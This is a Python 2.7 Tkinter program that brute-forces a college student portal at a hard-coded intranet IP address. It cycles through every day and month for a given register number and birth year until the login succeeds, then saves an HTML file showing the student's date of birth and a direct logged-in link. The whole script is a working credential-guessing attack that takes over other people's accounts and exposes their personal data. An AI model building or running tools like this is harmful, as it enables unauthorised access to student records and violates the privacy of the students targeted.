#Python Version 2.7 
#APPLICATION: Info Finder for SJCTNI in GUI
#CODER: Manikandanraj B K
#B.Tech, CSE.
#SASTRA University.
#Last Update: 15/06/2017

from Tkinter import *
import Tkinter
import ttk
import tkMessageBox
import sys
import mechanize
import thread
import subprocess
import webbrowser
import os

d='0'
m='0'
y='0'
def bruteforce():
	global d
	global y
	global m
	global progress
	days=['01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31'];
	months=['01','02','03','04','05','06','07','08','09','10','11','12']
	id=regno.get()
	y=year.get()
	br = mechanize.Browser()
	br.set_handle_equiv(True)
	br.set_handle_redirect(True)
	br.set_handle_referer(True)
	br.set_handle_robots(False)
	br.addheaders = [ ( 'User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1' ) ]
        for d in days:
                for m in months:
                        br.open("http://210.212.250.37/intranet/loginpage_stud.jsp")
               	     	br.select_form(name="Login")
                       	br.form['userId'] = id
                        br.form['yyyy'] = y
                        br.form['dd']=d
                        br.form['mm']=m
                        progress["value"]+=1
                        response=br.submit()
                        if (response.geturl()=="http://210.212.250.37/intranet/login_frame_stud_.jsp"):
                                progress["value"]=372
        			url = 'http://210.212.250.34:8086/intranet/loggedin_stud.jsp?userId='+id+'&&dd='+d+'&&mm='+m+'&&yyyy='+y
                                f=open(id+'.html','w')
                                ht="<html><body>Register Number:"+id+"</br></br>DOB is:"+d+"-"+m+"-"+y+"</br></br><a href="+url+">Direct Link to open portal</a></body></<html>"
                                f.write(ht)
                                if sys.platform == 'darwin': 
                                        subprocess.Popen(['open', id+'.html'])                            
                                else:
                                        webbrowser.open_new_tab(id+'.html')
                                break
                if (response.geturl()=="http://210.212.250.37/intranet/login_frame_stud_.jsp"):
               		break
        if (response.geturl()!="http://210.212.250.37/intranet/login_frame_stud_.jsp"):
                f=open(id+'.html','w')
                ht="<html><body>Register Number:"+id+"</br></br>Wrong year. Try a different year or the Register Number is invalid</body></<html>"
                f.write(ht)
                if sys.platform == 'darwin': 
                        subprocess.Popen(['open', id+'.html'])                            
                else:
                        webbrowser.open_new_tab(id+'.html')
top= Tkinter.Tk()
top.wm_title("SJCTNI Student Portal Bruteforcer")
top.resizable(0,0)
def resulterr(suc=True,msg="Invalid Register Number!!"):
	if(suc==False):
		tkMessageBox.showinfo("Failed",msg)
def start():
        progress["value"]=0
	try:
		check()
	except Exception as e:
		print e
def quit():
	sys.exit()
def check():
	if(len(regno.get())!=8):
		resulterr(False)
	elif(len(year.get())!=4):
		resulterr(False,"Invalid Year")
	else:
                        thread.start_new_thread(bruteforce,())
b=Tkinter.Button(top,text="Bruteforce",command=start)
b.grid(row=4,column=0,pady=5,ipadx=8)
b1=Tkinter.Button(top,text="Exit",command=quit)
b1.grid(row=4,column=1,pady=5,ipadx=24)
label=Label(top,text="Register Number")
label.grid(row=1,column=0,pady=5)
label1=Label(top,text="Expected Year")
label1.grid(row=2,column=0,pady=5)
regno=Entry(top)
regno.grid(row=1,column=1,pady=10)
year=Entry(top)
year.grid(row=2,column=1,pady=10)
progress= ttk.Progressbar(top,orient="horizontal",mode="determinate",maximum=372)
progress.grid(row=5,ipadx=100,columnspan=2)

top.mainloop()
